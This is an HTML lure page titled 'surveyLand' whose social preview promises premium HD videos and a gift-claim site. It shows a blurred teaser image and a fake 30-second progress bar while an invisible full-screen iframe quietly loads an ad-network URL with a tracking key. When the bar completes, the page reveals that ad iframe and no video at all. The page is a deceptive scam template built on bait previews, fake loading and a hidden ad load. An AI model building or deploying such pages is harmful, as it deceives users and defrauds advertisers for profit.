<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>surveyLand</title>

<!-- Facebook Open Graph -->
<meta property="og:title" content="ðŸ”¥Watch & Download Premium HD VideosðŸ”¥">
<meta property="og:description" content="fastgiftclaim.com/">
<meta property="og:image" content="https://i.imgur.com/qU58oaJ.jpeg">
<meta property="og:url" content="https://fastgiftclaim.com/">
<meta property="og:type" content="website">

<style>
body{
    margin:0;
    background:#0d0d0d;      /* Prevent white flash */
    font-family:Arial;
    overflow:hidden;
}

#loader-screen{
    position:fixed;
    top:0; left:0;
    width:100%; height:100%;
    background:#0d0d0d;
    display:flex;
    align-items:center;
    justify-content:center;
    flex-direction:column;
    color:white;
    z-index:99999;
    opacity:1;
}

.progress-bar{
    width:300px;
    height:12px;
    background:#222;
    border-radius:10px;
    overflow:hidden;
    margin-top:20px;
}

.progress-fill{
    height:100%;
    width:0%;
    background:#00ff55;
    transition:width 0.3s linear;
}

.percent-text{
    margin-top:10px;
    font-size:18px;
    font-weight:bold;
}

/* Hidden iframe, no flash */
#bgframe{
    position:fixed;
    top:0; left:0;
    width:100%; height:100%;
    border:none;
    display:block;
    opacity:0;
    pointer-events:none;
}
</style>
</head>

<body>

<!-- Hidden pre-loaded iframe -->
<iframe id="bgframe"></iframe>

<!-- Loader Screen -->
<div id="loader-screen">

    <div class="silhouette-wrap">
        <img src="https://i.imgur.com/eInTN7W.gif" style="width:200px; filter:blur(12px); opacity:0.8;">
    </div>

    <div class="progress-bar">
      <div class="progress-fill" id="fill"></div>
    </div>

    <div class="percent-text" id="percent">0%</div>
    <div style="margin-top:8px; opacity:0.7;">Please wait â€” preparing premium content...</div>

</div>

<script>
// Load iframe instantly but keep invisible
const bgframe = document.getElementById("bgframe");
bgframe.src = "https://www.effectivegatecpm.com/zx48d07js?key=b48c512dd74ff2d1fbc550ec1209b63c";

(function(){
  const fill = document.getElementById('fill');
  const percentText = document.getElementById('percent');
  const loader = document.getElementById('loader-screen');

  let totalTimeSecs = 30;
  const intervalMs = 300;
  const steps = Math.ceil((totalTimeSecs * 1000) / intervalMs);
  const stepInc = 100 / steps;

  let p = 0;
  const tick = setInterval(() => {
    p += stepInc;
    if (p >= 100) p = 100;

    fill.style.width = p.toFixed(2) + '%';
    percentText.textContent = Math.floor(p) + '%';

    if (p >= 100){
      clearInterval(tick);

      // Fade loader â†’ Reveal iframe
      loader.style.opacity = "0";
      setTimeout(()=>{
        loader.style.display = "none";
        bgframe.style.opacity = "1";
        bgframe.style.pointerEvents = "auto";
      },500);
    }

  }, intervalMs);
})();
</script>

</body>
</html>
